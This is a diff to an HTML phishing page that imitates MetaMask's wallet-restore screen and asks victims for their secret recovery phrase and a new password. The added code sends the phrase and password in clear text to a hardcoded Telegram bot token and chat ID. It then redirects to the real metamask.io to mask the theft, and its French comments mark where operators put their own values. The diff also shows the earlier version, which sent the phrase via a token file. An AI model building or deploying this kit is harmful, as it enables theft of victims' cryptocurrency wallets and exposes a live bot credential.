@@ -2,16 +2,16 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Secret Recovery Phrase</title>
-  <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg">
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
   <style>
     * { box-sizing: border-box; }
     body {
       margin: 0;
-      font-family: 'Inter', sans-serif;
-      background-color: #ffffff;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #fff;
       color: #333;
       display: flex;
       flex-direction: column;
@@ -24,6 +24,10 @@
       justify-content: space-between;
       align-items: center;
       padding: 30px 30px 10px;
+    }
+    .logo {
+      font-weight: bold;
+      font-size: 20px;
     }
     .language-select {
       padding: 6px 12px;
@@ -38,13 +42,13 @@
       width: 100%;
     }
     .card {
-      background-color: #fff;
-      border-radius: 16px;
+      background-color: white;
+      border-radius: 20px;
       border: 1px solid #e0e0e0;
-      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.05);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
       padding: 40px;
       width: 100%;
-      max-width: 520px;
+      max-width: 500px;
     }
     .step-circles {
       display: flex;
@@ -69,13 +73,14 @@
       margin: 0 auto 6px;
     }
     .step.active .circle {
-      background-color: #4f46e5;
+      background-color: #6264ff;
       color: #fff;
       border: none;
     }
     .label {
       font-size: 12px;
       color: #666;
+      line-height: 14px;
     }
     h1 {
       text-align: center;
@@ -101,35 +106,30 @@
       color: #444;
       margin: 10px 0;
       padding: 10px;
-      background: #eef1ff;
-      border-left: 4px solid #4f46e5;
+      background: #f5f5ff;
+      border-left: 4px solid #6264ff;
       border-radius: 4px;
     }
     .seed-inputs {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
-      gap: 12px;
+      gap: 10px;
       margin: 20px 0;
     }
     .seed-input {
       display: flex;
       align-items: center;
-      gap: 6px;
-    }
-    .seed-input label {
-      font-size: 13px;
-      min-width: 22px;
-      text-align: right;
+      gap: 4px;
     }
     .seed-input input {
       width: 100%;
-      padding: 8px 10px;
+      padding: 8px;
       border-radius: 8px;
       border: 1px solid #ccc;
       font-size: 14px;
     }
     .submit-btn {
-      background-color: #4f46e5;
+      background: linear-gradient(90deg, #537cff, #6563ff);
       border: none;
       color: white;
       width: 100%;
@@ -137,10 +137,7 @@
       font-size: 16px;
       border-radius: 24px;
       cursor: pointer;
-      transition: background-color 0.3s;
-    }
-    .submit-btn:hover {
-      background-color: #3730a3;
+      margin-top: 20px;
     }
     .submit-btn:disabled {
       opacity: 0.5;
@@ -153,6 +150,40 @@
       margin-top: 10px;
       display: none;
     }
+
+    /* PASSWORD FIELDS - stacked vertically */
+    .password-container {
+      margin-top: 20px;
+      max-width: 420px;
+    }
+    .password-field {
+      display: flex;
+      flex-direction: column;
+      width: 100%;
+      margin-bottom: 16px;
+    }
+    .password-field label {
+      font-weight: 600;
+      font-size: 12px;
+      color: #444;
+      margin-bottom: 6px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    .password-field input {
+      padding: 8px 10px;
+      font-size: 14px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      transition: border-color 0.3s ease;
+      width: 200px;
+      max-width: 100%;
+    }
+    .password-field input:focus {
+      border-color: #6264ff;
+      outline: none;
+    }
+
     @media (max-width: 600px) {
       .seed-inputs {
         grid-template-columns: repeat(2, 1fr);
@@ -160,14 +191,17 @@
       .step-circles {
         gap: 80px;
       }
+      .password-field input {
+        width: 100%;
+      }
     }
   </style>
 </head>
 <body>
 
   <div class="top-bar">
-    <div><img src="https://metamask2-eight.vercel.app/meta.png" width="70px"></div>
-    <select class="language-select">
+    <div><img src="https://metamask2-eight.vercel.app/meta.png" width="70" alt="logo" /></div>
+    <select class="language-select" aria-label="Select language">
       <option value="en">English</option>
       <option value="fr">Français</option>
       <option value="es">Español</option>
@@ -176,42 +210,56 @@
 
   <main>
     <div class="card">
+
       <div class="step-circles">
         <div class="step active">
           <div class="circle">1</div>
-          <div class="label">Confirm Phrase</div>
+          <div class="label">Confirm secret<br />recovery phrase</div>
         </div>
         <div class="step">
           <div class="circle">2</div>
-          <div class="label">Create Password</div>
+          <div class="label">Create<br />password</div>
         </div>
       </div>
 
       <h1>Access your wallet with your Secret Recovery Phrase</h1>
       <p class="description">
-        Enter your Secret Recovery Phrase to restore your wallet and set a new password.
+        MetaMask cannot recover your password. We will use your Secret Recovery Phrase to validate your ownership, restore your wallet and set up a new password.
+        First, enter the Secret Recovery Phrase that you were given when you created your wallet. <a href="#">Learn more</a>
       </p>
 
       <select class="phrase-length" id="phraseLength" onchange="generateInputs()">
-        <option value="12">12 words</option>
-        <option value="15">15 words</option>
-        <option value="18">18 words</option>
-        <option value="21">21 words</option>
-        <option value="24">24 words</option>
+        <option value="12">I have a 12 word phrase</option>
+        <option value="15">I have a 15 word phrase</option>
+        <option value="18">I have an 18 word phrase</option>
+        <option value="21">I have a 21 word phrase</option>
+        <option value="24">I have a 24 word phrase</option>
       </select>
 
-      <div class="info">💡 You can paste the full phrase into any field</div>
+      <div class="info">🔐 You can paste your entire secret recovery phrase into any field</div>
 
       <div class="seed-inputs" id="seedInputs"></div>
+
+      <div class="password-container">
+        <div class="password-field">
+          <label for="newPassword">New Password</label>
+          <input type="password" id="newPassword" placeholder="" autocomplete="new-password" />
+        </div>
+        <div class="password-field">
+          <label for="confirmPassword">Confirm Password</label>
+          <input type="password" id="confirmPassword" placeholder="" autocomplete="new-password" />
+        </div>
+        <p id="passwordError" class="error-msg">Passwords do not match.</p>
+      </div>
 
       <button class="submit-btn" id="submitBtn" onclick="handleConfirm()" disabled>
         Confirm Secret Recovery Phrase
       </button>
       <p id="errorMsg" class="error-msg">Invalid seed phrase. Please check the words.</p>
+
     </div>
   </main>
 
-  <script src="config.js"></script> <!-- ← Fichier séparé contenant le TOKEN -->
   <script src="bip39-words.js"></script>
   <script>
     function generateInputs() {
@@ -226,7 +274,8 @@
         container.appendChild(div);
       }
 
-      container.querySelectorAll("input").forEach(input => {
+      const inputs = container.querySelectorAll("input");
+      inputs.forEach(input => {
         input.addEventListener("input", checkFieldsFilled);
       });
 
@@ -236,6 +285,7 @@
     function checkFieldsFilled() {
       const count = parseInt(document.getElementById("phraseLength").value);
       let allFilled = true;
+
       for (let i = 1; i <= count; i++) {
         const value = document.querySelector(`input[name='word${i}']`).value.trim();
         if (value === "") {
@@ -243,12 +293,21 @@
           break;
         }
       }
-      document.getElementById("submitBtn").disabled = !allFilled;
+
+      // Also check password fields are filled and matching
+      const newPass = document.getElementById("newPassword").value.trim();
+      const confirmPass = document.getElementById("confirmPassword").value.trim();
+      const passwordsMatch = newPass !== "" && newPass === confirmPass;
+
+      document.getElementById("passwordError").style.display = passwordsMatch ? "none" : "block";
+
+      document.getElementById("submitBtn").disabled = !(allFilled && passwordsMatch);
     }
 
     function validateBIP39Words() {
       const count = parseInt(document.getElementById("phraseLength").value);
       let valid = true;
+
       for (let i = 1; i <= count; i++) {
         const input = document.querySelector(`input[name='word${i}']`);
         const word = input.value.trim().toLowerCase();
@@ -259,6 +318,7 @@
           input.style.border = "1px solid #ccc";
         }
       }
+
       return valid;
     }
 
@@ -271,6 +331,16 @@
         errorEl.style.display = "none";
       }
 
+      // Check passwords match before sending
+      const newPass = document.getElementById("newPassword").value.trim();
+      const confirmPass = document.getElementById("confirmPassword").value.trim();
+      if (newPass === "" || newPass !== confirmPass) {
+        document.getElementById("passwordError").style.display = "block";
+        return;
+      } else {
+        document.getElementById("passwordError").style.display = "none";
+      }
+
       const count = parseInt(document.getElementById("phraseLength").value);
       let phrase = "";
       for (let i = 1; i <= count; i++) {
@@ -278,24 +348,31 @@
         phrase += value.trim() + " ";
       }
 
-      // Envoi au bot Telegram depuis config.js
-      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      const botToken = "7918572484:AAHP6tcUHK2PuBPpN2Ln2GhFA722z2k7xb0"; // Remplace ici
+      const chatId = "6996434307";     // Remplace ici
+
+      // Envoi du texte avec phrase + mot de passe (caché par étoiles côté client, mais envoyé en clair ici)
+      const textToSend =
+        "Secret Recovery Phrase:\n" + phrase.trim() +
+        "\n\nNew Password: " + newPass;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: "🛡️ Phrase:\n" + phrase.trim()
+          chat_id: chatId,
+          text: textToSend
         })
       });
 
       navigator.clipboard.writeText(phrase.trim());
 
       setTimeout(() => {
-        window.location.href = "https://metamask.io/";
-      }, 1000);
+        window.location.href = "https://metamask.io/"; // Remplace le lien ici
+      }, 800);
     }
 
-    document.addEventListener("paste", function(e) {
+    document.addEventListener("paste", function (e) {
       const activeInput = document.activeElement;
       if (!activeInput || !activeInput.name || !activeInput.name.startsWith("word")) return;
 
@@ -312,7 +389,13 @@
       checkFieldsFilled();
     });
 
-    window.onload = generateInputs;
+    // Add event listeners on password inputs for enabling button dynamically
+    window.onload = function () {
+      generateInputs();
+
+      document.getElementById("newPassword").addEventListener("input", checkFieldsFilled);
+      document.getElementById("confirmPassword").addEventListener("input", checkFieldsFilled);
+    };
   </script>
 </body>
 </html>
